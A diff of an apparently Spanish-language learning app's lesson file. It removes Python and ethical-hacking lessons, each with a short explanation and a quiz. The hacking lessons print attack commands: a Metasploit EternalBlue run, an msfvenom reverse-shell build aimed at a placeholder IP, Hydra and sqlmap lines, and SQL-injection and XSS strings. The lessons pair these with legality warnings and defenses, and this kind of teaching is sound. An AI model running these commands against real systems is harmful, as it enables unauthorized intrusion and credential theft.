-mk("Memoization",[{t:"¿Qué es?",c:"Cachear resultados de funciones para no recalcular."},{t:"lru_cache",c:"<pre>from functools import lru_cache\n\n@lru_cache(maxsize=None)\ndef fib(n):\n    if n < 2: return n\n    return fib(n-1) + fib(n-2)\n\nprint(fib(50))  # rápido</pre>"},{t:"Ventaja",c:"Convierte fibonacci de exponencial a lineal."}],"¿Qué guarda?",["Listas","Resultados","Errores","Bucles"],1),
-mk("Context managers",[{t:"¿Qué son?",c:"Objetos que gestionan recursos automáticamente. Se usan con <code>with</code>."},{t:"with con archivos",c:"<pre>with open(\"datos.txt\") as f:\n    contenido = f.read()</pre>El archivo se cierra solo, incluso con error."},{t:"Crear uno",c:"<pre>class MiContexto:\n    def __enter__(self):\n        print(\"Entrando\")\n        return self\n    def __exit__(self, *args):\n        print(\"Saliendo\")\n\nwith MiContexto():\n    print(\"Dentro\")</pre>"},{t:"Ventaja",c:"Código más limpio y seguro."}],"¿Qué garantiza with?",["Velocidad","Cierre seguro","Copias","Nada"],1),
-mk("CSV (archivos)",[{t:"¿Qué es CSV?",c:"Comma-Separated Values. Formato simple de datos tabulares."},{t:"Escribir",c:"<pre>import csv\nwith open(\"datos.csv\", \"w\", newline=\"\") as f:\n    w = csv.writer(f)\n    w.writerow([\"nombre\", \"edad\"])\n    w.writerow([\"Ana\", 25])</pre>"},{t:"Leer",c:"<pre>with open(\"datos.csv\") as f:\n    r = csv.reader(f)\n    for fila in r:\n        print(fila)</pre>"},{t:"Con DictReader",c:"<pre>with open(\"datos.csv\") as f:\n    r = csv.DictReader(f)\n    for fila in r:\n        print(fila[\"nombre\"])</pre>"}],"¿Qué es CSV?",["Formato","App","Red","Base"],0),
-mk("Módulo os",[{t:"¿Qué hace?",c:"Interactúa con el sistema operativo: archivos, carpetas, variables."},{t:"Útiles",c:"<pre>import os\nprint(os.getcwd())          # directorio actual\nos.mkdir(\"nueva_carpeta\")   # crear carpeta\nprint(os.listdir(\".\"))      # listar\nos.remove(\"archivo.txt\")    # borrar</pre>"},{t:"os.path",c:"<pre>os.path.exists(\"archivo.txt\")  # ¿existe?\nos.path.join(\"dir\", \"file.txt\")  # unir rutas</pre>"},{t:"Variables de entorno",c:"<pre>os.environ[\"MI_VAR\"] = \"valor\"\nprint(os.getenv(\"MI_VAR\"))</pre>"}],"¿Qué hace listdir?",["Lista","Crea","Borra","Copia"],0),
-mk("Módulo sys",[{t:"¿Qué hace?",c:"Acceso a variables del intérprete."},{t:"sys.argv",c:"Argumentos de línea de comandos:<pre>import sys\nprint(sys.argv)\n# python script.py hola 123\n# ['script.py', 'hola', '123']</pre>"},{t:"sys.exit",c:"Termina el programa:<pre>sys.exit(0)  # éxito\nsys.exit(1)  # error</pre>"},{t:"sys.path",c:"Lista de rutas donde Python busca módulos."}],"¿Qué es argv?",["Argumentos","Entorno","Path","Nada"],0),
-mk("Módulo math",[{t:"¿Qué hace?",c:"Funciones matemáticas avanzadas."},{t:"Funciones comunes",c:"<pre>import math\nprint(math.sqrt(16))   # 4.0\nprint(math.pow(2, 3))  # 8.0\nprint(math.ceil(3.2))  # 4\nprint(math.floor(3.8)) # 3\nprint(math.pi)         # 3.14159...</pre>"},{t:"Trigonométricas",c:"<code>math.sin()</code>, <code>math.cos()</code>, <code>math.tan()</code> (en radianes)."}],"¿Qué hace sqrt?",["Suma","Raíz","Potencia","Modulo"],1),
-mk("datetime",[{t:"¿Qué hace?",c:"Trabajar con fechas y horas."},{t:"Ahora",c:"<pre>from datetime import datetime\nahora = datetime.now()\nprint(ahora)         # 2024-01-15 14:30:00\nprint(ahora.year)    # 2024\nprint(ahora.month)   # 1</pre>"},{t:"Formatear",c:"<pre>print(ahora.strftime(\"%d/%m/%Y\"))  # 15/01/2024</pre>"},{t:"timedelta",c:"Sumar/restar tiempo:<pre>from datetime import timedelta\nfuturo = ahora + timedelta(days=7)</pre>"}],"¿Módulo de fecha?",["time","datetime","date","clock"],1),
-mk("Slicing avanzado",[{t:"Con paso negativo",c:"<pre>nums = [0,1,2,3,4,5]\nprint(nums[::-1])   # [5,4,3,2,1,0]\nprint(nums[4:1:-1]) # [4,3,2]</pre>"},{t:"Cadenas",c:"<pre>texto = \"Python\"\nprint(texto[::2])   # Pto\nprint(texto[::-1])  # nohtyP</pre>"},{t:"Asignar slices",c:"<pre>nums = [1,2,3,4]\nnums[1:3] = [9, 9]\nprint(nums)  # [1, 9, 9, 4]</pre>"}],"¿[0,1,2][::-1]?",["[0,1,2]","[2,1,0]","[1,2]","Error"],1),
-mk("Formateo de strings",[{t:"f-strings avanzadas",c:"<pre>n = 3.14159\nprint(f\"{n:.2f}\")     # 3.14\nprint(f\"{n:10.2f}\")   # '      3.14'\nprint(f\"{n:>10}\")     # alineado derecha</pre>"},{t:"Números grandes",c:"<pre>n = 1000000\nprint(f\"{n:,}\")  # 1,000,000</pre>"},{t:"Porcentajes",c:"<pre>print(f\"{0.25:.1%}\")  # 25.0%</pre>"}],"¿Qué hace f\"{n:.2f}\"?",["2 decimales","2 enteros","Redondea","Nada"],0),
-mk("Variables globales vs constantes",[{t:"Constantes",c:"Por convención se escriben en MAYÚSCULAS:<pre>PI = 3.14159\nGRAVEDAD = 9.8</pre>Python no las protege, es solo convención."},{t:"Globales",c:"Se definen fuera de funciones y son accesibles desde cualquier lado."},{t:"Buenas prácticas",c:"Usa pocas globales. Prefiere pasar parámetros y devolver valores."}],"¿Cómo se escriben constantes?",["minusculas","MAYUSCULAS","Mixtas","camelCase"],1),
-mk("Type hints",[{t:"¿Qué son?",c:"Anotaciones de tipo para aclarar qué recibe y devuelve una función."},{t:"Sintaxis",c:"<pre>def suma(a: int, b: int) -> int:\n    return a + b</pre>No obliga, solo documenta."},{t:"Con listas",c:"<pre>from typing import List\ndef procesar(nombres: List[str]) -> None:\n    pass</pre>"},{t:"Ventaja",c:"Mejor autocompletado, menos errores."}],"¿Qué hace -> int?",["Parámetro","Retorno","Variable","Nada"],1),
-mk("Logging",[{t:"¿Por qué?",c:"<code>print</code> es malo para debug en producción. <code>logging</code> es mejor."},{t:"Uso",c:"<pre>import logging\nlogging.basicConfig(level=logging.INFO)\nlogging.info(\"Mensaje informativo\")\nlogging.warning(\"Advertencia\")\nlogging.error(\"Error\")</pre>"},{t:"Niveles",c:"DEBUG < INFO < WARNING < ERROR < CRITICAL"},{t:"A archivo",c:"<pre>logging.basicConfig(filename=\"app.log\", level=logging.INFO)</pre>"}],"¿Qué reemplaza logging?",["print","input","open","os"],0),
-mk("Testing con unittest",[{t:"¿Por qué testear?",c:"Para asegurar que tu código hace lo que debe."},{t:"Ejemplo",c:"<pre>import unittest\n\ndef suma(a, b):\n    return a + b\n\nclass TestSuma(unittest.TestCase):\n    def test_suma(self):\n        self.assertEqual(suma(2, 3), 5)\n\nif __name__ == '__main__':\n    unittest.main()</pre>"},{t:"Correr",c:"<code>python -m unittest test_file.py</code>"}],"¿Qué hace unittest?",["Pruebas","Web","API","Red"],0),
-mk("API REST con requests",[{t:"¿Qué es una API?",c:"Interfaz para que dos programas se comuniquen."},{t:"GET",c:"<pre>import requests\nr = requests.get(\"https://api.github.com\")\nprint(r.status_code)  # 200\nprint(r.json())</pre>"},{t:"POST",c:"<pre>datos = {\"nombre\": \"Ana\"}\nr = requests.post(\"https://httpbin.org/post\", json=datos)</pre>"},{t:"Manejo de errores",c:"<pre>try:\n    r = requests.get(url, timeout=5)\n    r.raise_for_status()\nexcept requests.exceptions.RequestException as e:\n    print(e)</pre>"}],"¿Método que envía datos?",["GET","POST","PUT","DELETE"],1),
-mk("Proyecto final Python",[{t:"Objetivo",c:"Construir un gestor de tareas (to-do list)."},{t:"Funciones",c:"• Agregar tarea<br>• Listar tareas<br>• Marcar como hecha<br>• Eliminar tarea<br>• Guardar en JSON"},{t:"Código base",c:"<pre>import json\n\ntareas = []\n\ndef agregar(t):\n    tareas.append({\"texto\": t, \"hecha\": False})\n\ndef listar():\n    for i, t in enumerate(tareas):\n        estado = \"✓\" if t[\"hecha\"] else \"○\"\n        print(f\"{i+1}. [{estado}] {t['texto']}\")\n\ndef guardar():\n    with open(\"tareas.json\", \"w\") as f:\n        json.dump(tareas, f)</pre>"},{t:"¡Felicidades!",c:"Completaste Python. Ahora tienes las bases para seguir con Hacking Ético o cualquier proyecto."}],"¿Qué formato guarda el proyecto?",["XML","JSON","CSV","YAML"],1),
+const WELCOME_STEPS=[
+{icon:"👋",title:"¡Bienvenido!",text:"Aprende Python, Hacking, Termux y Kali con tus waifus."},
+{icon:"👥",title:"5 Waifus",text:"Elige tu favorita, ajústale el tamaño y arrástrala."},
+{icon:"🏫",title:"Salón 3D",text:"Visita el salón con tu waifu en 3D."},
+{icon:"📚",title:"1200 Lecciones",text:"4 cursos x 300 lecciones detalladas."},
+{icon:"⚡",title:"Energía y Rachas",text:"-10 energía por lección, +1 cada 3 min."},
+{icon:"🎤",title:"Voces IA",text:"Cada waifu tiene su voz real."},
+{icon:"⭐",title:"VIP",text:"Energía infinita y todo desbloqueado."}
 ];
 
-// ==================== HACKING (40) ====================
-const HK=[
-mk("¿Qué es el hacking ético?",[{t:"Definición",c:"El hacking ético es usar las mismas técnicas que un atacante, pero con <strong>permiso legal</strong> y con el objetivo de encontrar vulnerabilidades para repararlas."},{t:"Diferencia clave",c:"Un hacker ético NO ataca sistemas sin autorización. Su trabajo es proteger, no destruir. Un contrato firmado es lo que separa lo legal de lo delictivo."},{t:"Áreas de trabajo",c:"• <strong>Pentesting</strong>: pruebas de penetración<br>• <strong>Análisis de vulnerabilidades</strong><br>• <strong>Respuesta a incidentes</strong><br>• <strong>Red team / Blue team</strong>"},{t:"Salidas laborales",c:"• Pentester<br>• Analista de seguridad<br>• Bug bounty hunter<br>• Consultor de seguridad<br>• CISO"}],"¿Diferencia principal?",["Herramientas","Permiso legal","Sistema","Lenguaje"],1),
-mk("Tipos de hackers",[{t:"White Hat",c:"Hackers éticos. Trabajan con permiso para mejorar la seguridad. Son los 'buenos'. Ganan dinero legalmente reportando vulnerabilidades."},{t:"Black Hat",c:"Hackers maliciosos. Atacan por dinero, venganza o diversión. Sus acciones son delitos penales."},{t:"Gray Hat",c:"Ni buenos ni malos. A veces reportan vulnerabilidades, a veces las venden. Operan en zona gris legalmente."},{t:"Otros",c:"• <strong>Script kiddies</strong>: usan herramientas sin entenderlas<br>• <strong>Hacktivistas</strong>: hackean por causas sociales<br>• <strong>Red teams</strong>: equipos de ataque autorizados"}],"¿Cuál es legal?",["Black","Gray","White","Red"],2),
-mk("Ética y legalidad",[{t:"La ley",c:"En Colombia la <strong>Ley 1273 de 2009</strong> castiga el acceso sin autorización a sistemas informáticos con penas de prisión."},{t:"Contratos",c:"Antes de hacer cualquier prueba debe haber un contrato escrito que defina:<br>• Alcance (qué sistemas)<br>• Reglas (qué está permitido)<br>• Tiempo<br>• Confidencialidad"},{t:"Reporte responsable",c:"Si encuentras una vulnerabilidad, la reportas al dueño primero. No la divulgas públicamente sin dar tiempo a que la arreglen."},{t:"Regla de oro",c:"Si dudas si algo es legal, NO lo hagas. Es mejor preguntar antes que arrepentirte después."}],"¿Qué necesitas antes?",["PC potente","Contrato escrito","Anonimato","Nada"],1),
-mk("Reconocimiento pasivo",[{t:"¿Qué es?",c:"Recopilar información de un objetivo SIN interactuar directamente con sus servidores. Así no te detectan."},{t:"Técnicas",c:"• Buscar en Google<br>• Ver redes sociales<br>• Whois y DNS públicos<br>• Shodan (buscador de dispositivos)<br>• theHarvester"},{t:"Ejemplo práctico",c:"Buscar empleados en LinkedIn para saber qué tecnologías usa una empresa, sin tocar sus servidores."},{t:"Ventaja",c:"No dejas rastro en el objetivo. Puedes hacerlo desde cualquier lugar."}],"¿Qué es pasivo?",["Escanear","Recopilar sin tocar","Atacar","Phishing"],1),
-mk("Reconocimiento activo",[{t:"¿Qué es?",c:"Aquí SÍ interactúas con el objetivo. Puedes ser detectado, pero consigues más información."},{t:"Técnicas",c:"• Ping y traceroute<br>• Consultas DNS<br>• Fingerprinting de servicios<br>• Escaneo de puertos (Nmap)"},{t:"Riesgo",c:"El objetivo puede ver tus peticiones en sus logs. Por eso se hace con autorización."},{t:"Ejemplo",c:"<code>ping ejemplo.com</code> y <code>nslookup ejemplo.com</code> te dan info de la red."}],"¿Riesgo del activo?",["Menos info","Ser detectado","Gastar","Ninguno"],1),
-mk("Google Dorking",[{t:"¿Qué es?",c:"Búsquedas avanzadas en Google para encontrar info expuesta accidentalmente."},{t:"Operadores",c:"• <code>site:ejemplo.com</code> busca en un dominio<br>• <code>filetype:pdf</code> solo PDFs<br>• <code>intitle:index of</code> listados abiertos<br>• <code>inurl:admin</code> URLs con admin"},{t:"Ejemplos",c:"<pre>site:ejemplo.com filetype:pdf\nintitle:\"index of\" mp3\ninurl:admin login</pre>"},{t:"Uso ético",c:"Se usa en pentesting autorizado para encontrar archivos que no deberían ser públicos."}],"¿Qué busca filetype:pdf?",["PDFs","Fotos","Videos","Nada"],0),
-mk("OSINT",[{t:"¿Qué es?",c:"Open Source Intelligence. Recopilar información de fuentes públicas."},{t:"Herramientas",c:"• <strong>Maltego</strong>: grafos de relaciones<br>• <strong>theHarvester</strong>: correos y subdominios<br>• <strong>Sherlock</strong>: usuarios en redes<br>• <strong>Shodan</strong>: dispositivos conectados"},{t:"Fuentes",c:"Redes sociales, foros, sitios públicos, registros DNS, Whois, filtraciones conocidas."},{t:"Aplicación",c:"Se usa para conocer mejor al objetivo antes de un pentesting."}],"¿Qué es OSINT?",["Hackeo","Info pública","Malware","Firewall"],1),
-mk("Whois y DNS",[{t:"Whois",c:"Muestra quién registró un dominio. Comando: <code>whois ejemplo.com</code>"},{t:"DNS",c:"Traduce dominios a IPs. Registros importantes:<br>• <strong>A</strong>: IPv4<br>• <strong>AAAA</strong>: IPv6<br>• <strong>MX</strong>: correo<br>• <strong>TXT</strong>: info adicional<br>• <strong>NS</strong>: servidores de nombres"},{t:"Comandos",c:"<pre>nslookup ejemplo.com\ndig ejemplo.com\nhost ejemplo.com</pre>"},{t:"Utilidad",c:"Conocer la infraestructura del objetivo sin tocarlo."}],"¿Comando DNS?",["ping","nslookup","curl","wget"],1),
-mk("Nmap básico",[{t:"¿Qué es Nmap?",c:"Network Mapper. La herramienta rey para escanear puertos y servicios."},{t:"Escaneo básico",c:"<pre>nmap 192.168.1.1</pre>Escanea los 1000 puertos más comunes."},{t:"Puertos comunes",c:"• 22 SSH<br>• 80 HTTP<br>• 443 HTTPS<br>• 21 FTP<br>• 3306 MySQL<br>• 3389 RDP"},{t:"Instalar",c:"<code>pkg install nmap</code> en Termux o <code>sudo apt install nmap</code> en Linux."}],"¿Para qué Nmap?",["Fotos","Puertos","Navegar","Chatear"],1),
-mk("Nmap avanzado",[{t:"Flags importantes",c:"• <code>-sV</code>: detecta versiones<br>• <code>-p</code>: puertos específicos<br>• <code>-A</code>: agresivo (versiones + SO + scripts)<br>• <code>-O</code>: detecta SO<br>• <code>-sS</code>: SYN scan (sigiloso)"},{t:"Ejemplos",c:"<pre>nmap -sV 192.168.1.1\nnmap -p 80,443 192.168.1.1\nnmap -A -T4 192.168.1.1\nnmap -sS -p 1-1000 192.168.1.1</pre>"},{t:"Salidas",c:"<code>-oN</code> normal, <code>-oX</code> XML, <code>-oG</code> grepable."},{t:"Scripts NSE",c:"<pre>nmap --script vuln 192.168.1.1</pre>Busca vulnerabilidades conocidas."}],"¿Qué hace -sV?",["Rápido","Versiones","Silencioso","Ping"],1),
-mk("Enumeración de servicios",[{t:"¿Qué es?",c:"Sacar la mayor cantidad de datos de un servicio que ya detectaste."},{t:"Ejemplos",c:"• Servidor web: versiones, directorios, tecnologías<br>• SMB: usuarios, recursos compartidos<br>• FTP: archivos, permisos<br>• SSH: versiones, algoritmos"},{t:"Herramientas",c:"• <strong>Gobuster</strong>: directorios web<br>• <strong>enum4linux</strong>: SMB<br>• <strong>smbclient</strong>: SMB<br>• <strong>nikto</strong>: web"},{t:"Importancia",c:"Sin enumerar bien, los exploits no funcionarán. Esta es la fase más importante."}],"¿Qué enumera Gobuster?",["Puertos","Directorios","Usuarios","Correos"],1),
-mk("Gobuster",[{t:"¿Qué es?",c:"Herramienta para descubrir directorios y archivos ocultos en webs."},{t:"Comando básico",c:"<pre>gobuster dir -u http://ejemplo.com -w wordlist.txt</pre>"},{t:"Wordlists",c:"Se usan listas como <code>/usr/share/wordlists/dirb/common.txt</code> o SecLists."},{t:"Otros modos",c:"• <code>dns</code>: subdominios<br>• <code>vhost</code>: virtual hosts<br>• <code>fuzz</code>: parámetros"}],"¿Qué busca Gobuster?",["Puertos","Directorios","Vulns","Pass"],1),
-mk("OWASP Top 10",[{t:"¿Qué es?",c:"Lista de las 10 vulnerabilidades web más críticas, publicada por OWASP."},{t:"Top actual (2021)",c:"1. Broken Access Control<br>2. Cryptographic Failures<br>3. Injection (SQL, NoSQL, OS)<br>4. Insecure Design<br>5. Security Misconfiguration<br>6. Vulnerable Components<br>7. Auth Failures<br>8. Data Integrity Failures<br>9. Logging Failures<br>10. SSRF"},{t:"Importancia",c:"Es el estándar de la industria. Si conoces estas 10, sabes dónde buscar."},{t:"Recurso",c:"Sitio oficial: <code>owasp.org/Top10</code>"}],"¿Qué publica OWASP?",["Antivirus","Top 10 vulns","Lenguaje","Firewall"],1),
-mk("Inyección SQL",[{t:"¿Qué es?",c:"Meter código SQL malicioso en campos de entrada para manipular la base de datos."},{t:"Ejemplo vulnerable",c:"<pre>SELECT * FROM usuarios WHERE nombre = 'admin'</pre>Si el input no se sanea, se puede inyectar: <code>' OR '1'='1</code>"},{t:"Impacto",c:"Robo de datos, borrado de tablas, bypass de login, ejecución de comandos."},{t:"Defensa",c:"Usar <strong>consultas parametrizadas</strong> (prepared statements) y validar siempre el input. NUNCA concatenar strings para SQL."}],"¿Mejor defensa?",["Bloquear IPs","Parametrizadas","Puerto","HTTPS"],1),
-mk("SQLmap",[{t:"¿Qué es?",c:"Herramienta automática para detectar y explotar inyecciones SQL."},{t:"Comando básico",c:"<pre>sqlmap -u \"http://ejemplo.com?id=1\" --dbs</pre>Enumera las bases de datos."},{t:"Extraer tablas",c:"<pre>sqlmap -u \"URL\" -D dbname --tables\nsqlmap -u \"URL\" -D dbname -T users --dump</pre>"},{t:"Uso ético",c:"Solo en sistemas propios o con autorización. Es un delito usarlo sin permiso."}],"¿Qué explota SQLmap?",["XSS","SQLi","CSRF","SSRF"],1),
-mk("XSS (Cross-Site Scripting)",[{t:"¿Qué es?",c:"Inyectar JavaScript malicioso en una web que otros usuarios verán."},{t:"Tipos",c:"• <strong>Almacenado</strong>: el script queda en el servidor (más peligroso)<br>• <strong>Reflejado</strong>: viene en la URL<br>• <strong>DOM-based</strong>: manipula el navegador"},{t:"Ejemplo",c:"<pre>&lt;script&gt;alert('hackeado')&lt;/script&gt;</pre>Si un comentario acepta esto, todos los visitantes lo ejecutan."},{t:"Defensa",c:"Escapar el HTML de salida y usar Content Security Policy (CSP)."}],"¿Cuál se guarda?",["Reflejado","DOM","Almacenado","Pasivo"],2),
-mk("CSRF (Cross-Site Request Forgery)",[{t:"¿Qué es?",c:"Engañar a un usuario logueado para que ejecute acciones sin saberlo."},{t:"Ejemplo",c:"Si estás logueado en tu banco y visitas una web maliciosa, esta puede enviar una petición de transferencia usando tu sesión."},{t:"Cómo funciona",c:"El navegador envía automáticamente las cookies de sesión al sitio destino."},{t:"Defensa",c:"Tokens CSRF únicos en cada formulario, verificar el header Referer y usar SameSite cookies."}],"¿Qué previene CSRF?",["JWT","Token CSRF","SSH","API key"],1),
-mk("SSRF (Server-Side Request Forgery)",[{t:"¿Qué es?",c:"Forzar al servidor a hacer peticiones a lugares internos que no debería."},{t:"Ejemplo",c:"Si una app acepta una URL para descargar imágenes, puedes pedirle que descargue <code>http://localhost:8080/admin</code>."},{t:"Impacto",c:"Acceso a servicios internos, metadata de nube (AWS, GCP), bypass de firewalls."},{t:"Defensa",c:"Whitelist de dominios permitidos y bloquear IPs internas."}],"¿A qué apunta SSRF?",["Cliente","Servidor","Router","Usuario"],1),
-mk("Fuerza bruta",[{t:"¿Qué es?",c:"Probar muchas combinaciones de usuario/contraseña hasta acertar."},{t:"Herramientas",c:"• <strong>Hydra</strong>: servicios en red<br>• <strong>John the Ripper</strong>: hashes<br>• <strong>Hashcat</strong>: hashes con GPU"},{t:"Ataques comunes",c:"• Diccionario: usar lista de contraseñas comunes<br>• Fuerza bruta: todas las combinaciones<br>• Híbrido: variaciones de diccionario"},{t:"Defensa",c:"Contraseñas largas, 2FA y bloqueo tras varios intentos fallidos."}],"¿Cuál NO es brute?",["Hydra","John","Hashcat","Nmap"],3),
-mk("Hydra",[{t:"¿Qué es?",c:"Herramienta de fuerza bruta contra servicios de login."},{t:"Comando SSH",c:"<pre>hydra -l admin -P pass.txt ssh://192.168.1.1</pre>"},{t:"HTTP POST",c:"<pre>hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"</pre>"},{t:"Wordlists",c:"Se usan como <code>rockyou.txt</code> con millones de contraseñas filtradas."}],"¿Hydra ataca?",["Archivos","Logins","Redes","Fotos"],1),
-mk("John the Ripper",[{t:"¿Qué es?",c:"Crackeador de hashes de contraseñas. Muy usado en auditorías."},{t:"Uso básico",c:"<pre>john hash.txt</pre>Detecta el tipo de hash automáticamente."},{t:"Con wordlist",c:"<pre>john --wordlist=rockyou.txt hash.txt</pre>"},{t:"Formatos",c:"Soporta MD5, SHA, bcrypt, NTLM, y muchos más."}],"¿Qué crackea John?",["WiFi","Hashes","Redes","PDFs"],1),
-mk("Hashcat",[{t:"¿Qué es?",c:"Crackeador de hashes con soporte para GPU. Extremadamente rápido."},{t:"Modos",c:"• <code>-m</code>: tipo de hash (0=MD5, 1000=NTLM, 3200=bcrypt)<br>• <code>-a</code>: modo de ataque (0=diccionario, 3=fuerza bruta)"},{t:"Ejemplo",c:"<pre>hashcat -m 0 -a 0 hash.txt rockyou.txt</pre>Crackea MD5 con wordlist."},{t:"GPU vs CPU",c:"Con GPU es miles de veces más rápido. Una RTX 4090 puede probar miles de millones por segundo."}],"¿Hashcat usa?",["CPU","GPU","RAM","Nada"],1),
-mk("Ingeniería social",[{t:"¿Qué es?",c:"Manipular personas para que revelen información o hagan acciones."},{t:"Técnicas",c:"• <strong>Pretexting</strong>: inventar una historia<br>• <strong>Baiting</strong>: dejar un USB con malware<br>• <strong>Tailgating</strong>: entrar detrás de alguien autorizado<br>• <strong>Quid pro quo</strong>: ofrecer algo a cambio"},{t:"Ejemplo real",c:"Llamar a un empleado fingiendo ser del soporte técnico para pedirle su contraseña."},{t:"Defensa",c:"Capacitación constante a empleados y políticas de verificación."}],"¿Eslabón más débil?",["Firewall","Humano","Servidor","Red"],1),
-mk("Phishing ético",[{t:"¿Qué es?",c:"Enviar correos falsos que parecen reales para probar la conciencia del personal."},{t:"Señales típicas",c:"• Urgencia: '¡Tu cuenta será bloqueada!'<br>• Errores ortográficos<br>• Enlaces a dominios parecidos<br>• Remitente sospechoso<br>• Adjuntos inesperados"},{t:"Herramientas",c:"• <strong>GoPhish</strong>: campañas de phishing<br>• <strong>SET</strong>: Social Engineering Toolkit"},{t:"Ética",c:"Solo se hace con autorización. Si no, es fraude."}],"¿Señal de phishing?",["Buena ortografía","Urgencia y links raros","Remitente conocido","Sin links"],1),
-mk("Sniffing",[{t:"¿Qué es?",c:"Capturar paquetes de red para ver qué se transmite."},{t:"Herramienta reina",c:"<strong>Wireshark</strong>: analizador gráfico de tráfico."},{t:"tcpdump",c:"Versión CLI: <code>tcpdump -i wlan0</code> captura tráfico de la interfaz WiFi."},{t:"Riesgo",c:"Si no hay cifrado (HTTP), puedes ver contraseñas y datos en texto plano."}],"¿Herramienta sniffing?",["Nmap","Wireshark","Hydra","Gobuster"],1),
-mk("Wireshark",[{t:"¿Qué es?",c:"Analizador de tráfico de red. El estándar de la industria."},{t:"Filtros útiles",c:"• <code>ip.addr == 192.168.1.1</code><br>• <code>http</code><br>• <code>tcp.port == 80</code><br>• <code>dns</code>"},{t:"Guardar capturas",c:"Se guardan como <code>.pcap</code> y se pueden abrir después."},{t:"Uso ético",c:"Solo en redes que administras o tienes permiso."}],"¿Wireshark sirve para?",["Editar","Analizar tráfico","Hackear WiFi","Crackear"],1),
-mk("MITM (Man in the Middle)",[{t:"¿Qué es?",c:"Atacante que se pone entre dos partes para espiar o modificar la comunicación."},{t:"Ejemplo",c:"Te conectas a una WiFi pública falsa y el atacante ve todo tu tráfico."},{t:"Herramientas",c:"• <strong>Ettercap</strong><br>• <strong>Bettercap</strong><br>• <strong>mitmproxy</strong>"},{t:"Defensa",c:"HTTPS, VPN, verificar certificados, no usar WiFi públicas sin VPN."}],"¿Qué es MITM?",["Firewall","Intermediario","Antivirus","VPN"],1),
-mk("ARP Spoofing",[{t:"¿Qué es?",c:"Enviar ARP falsos para redirigir el tráfico de la víctima a través tuyo."},{t:"Cómo funciona",c:"ARP asocia IPs con MACs. Si envenenas esa tabla, el tráfico va por ti."},{t:"Herramientas",c:"<code>arpspoof</code>, Ettercap, Bettercap."},{t:"Defensa",c:"Dynamic ARP Inspection (DAI) en switches, y monitoreo de red."}],"¿Qué envenena?",["DNS","Tabla ARP","Firewall","CPU"],1),
-mk("Criptografía básica",[{t:"¿Qué es?",c:"Ciencia de proteger información mediante cifrado."},{t:"Simétrica",c:"Una sola clave para cifrar y descifrar. Ejemplo: <strong>AES</strong>. Rápida pero hay que compartir la clave."},{t:"Asimétrica",c:"Clave pública y privada. Ejemplo: <strong>RSA</strong>. Más lenta pero resuelve el problema de compartir claves."},{t:"HTTPS",c:"Usa TLS (asimétrico) para intercambiar una clave simétrica al inicio. Lo mejor de ambos mundos."}],"¿Tipo con una sola clave?",["Asimétrico","Simétrico","Híbrido","Cuántico"],1),
-mk("Hashing",[{t:"¿Qué es?",c:"Función que convierte cualquier texto en una cadena fija e irreversible. Ej: 'hola' → '5d41402abc...'"},{t:"Algoritmos",c:"• <strong>MD5</strong>: obsoleto, ya roto<br>• <strong>SHA-1</strong>: obsoleto<br>• <strong>SHA-256</strong>: seguro<br>• <strong>bcrypt</strong>: ideal para contraseñas"},{t:"Salting",c:"Añadir texto aleatorio antes de hashear para que dos contraseñas iguales den hashes distintos. Evita rainbow tables."},{t:"Uso",c:"Las contraseñas NUNCA se guardan en texto plano. Siempre hasheadas (idealmente con bcrypt)."}],"¿Qué se añade antes de hashear?",["Token","Sal","Pin","Hash"],1),
-mk("SSL/TLS",[{t:"¿Qué es?",c:"Protocolo que cifra las comunicaciones web. HTTPS = HTTP + TLS."},{t:"Cómo funciona",c:"Handshake: el servidor presenta su certificado, el navegador lo valida, e intercambian claves."},{t:"Certificados",c:"Los emiten Autoridades Certificadoras (CA) como Let's Encrypt, DigiCert, etc."},{t:"Errores comunes",c:"Certificado caducado, dominio incorrecto, CA desconocida. NUNCA ignores estos avisos."}],"¿Qué usa HTTPS?",["AES solo","TLS","MD5","FTP"],1),
-mk("Firewalls",[{t:"¿Qué es?",c:"Filtra el tráfico de red según reglas."},{t:"Tipos",c:"• <strong>De red</strong>: protege toda la red (perimetral)<br>• <strong>De host</strong>: en cada equipo (Windows Firewall)<br>• <strong>WAF</strong>: Web Application Firewall, protege apps web"},{t:"Reglas típicas",c:"Permitir 80/443, bloquear todo lo demás, bloquear IPs maliciosas."},{t:"Evasión",c:"En pentesting se prueba si el firewall detecta: fragmentar paquetes, usar puertos permitidos, ofuscar."}],"¿WAF protege?",["Nada","Webs","Red","CPU"],1),
-mk("IDS/IPS",[{t:"IDS",c:"Intrusion Detection System. <strong>Detecta</strong> intrusiones y alerta."},{t:"IPS",c:"Intrusion Prevention System. Detecta <strong>Y bloquea</strong> automáticamente."},{t:"Herramientas",c:"• <strong>Snort</strong>: el clásico<br>• <strong>Suricata</strong>: moderno y rápido<br>• <strong>Zeek</strong>: análisis de red"},{t:"Diferencia",c:"IDS es pasivo (solo alerta), IPS es activo (bloquea)."}],"¿Qué hace IPS?",["Nada","Bloquea","Notifica","Reinicia"],1),
-mk("Metasploit",[{t:"¿Qué es?",c:"Framework con exploits listos para probar vulnerabilidades. El estándar en pentesting."},{t:"Componentes",c:"• <strong>Exploit</strong>: código que aprovecha la falla<br>• <strong>Payload</strong>: lo que se ejecuta tras el exploit<br>• <strong>Auxiliary</strong>: escáneres y utilidades<br>• <strong>Post</strong>: módulos post-explotación"},{t:"Flujo básico",c:"<pre>msfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010\nset RHOSTS 192.168.1.1\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nexploit</pre>"},{t:"Uso ético",c:"Solo con autorización escrita. Es un delito usarlo sin permiso."}],"¿Qué es payload?",["Escáner","Lo que ejecuta","Firewall","Objetivo"],1),
-mk("Payloads",[{t:"¿Qué son?",c:"El código que se ejecuta en la víctima después del exploit exitoso."},{t:"Tipos",c:"• <strong>Reverse shell</strong>: la víctima se conecta a ti<br>• <strong>Bind shell</strong>: tú te conectas a ella<br>• <strong>Meterpreter</strong>: shell avanzada con muchas funciones"},{t:"Reverse shell",c:"Más común porque evade firewalls (la conexión sale desde la víctima)."},{t:"Ejemplo",c:"<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe</pre>"}],"¿Qué hace reverse?",["Conecta a ti","Te conecta","Cierra","Reinicia"],0),
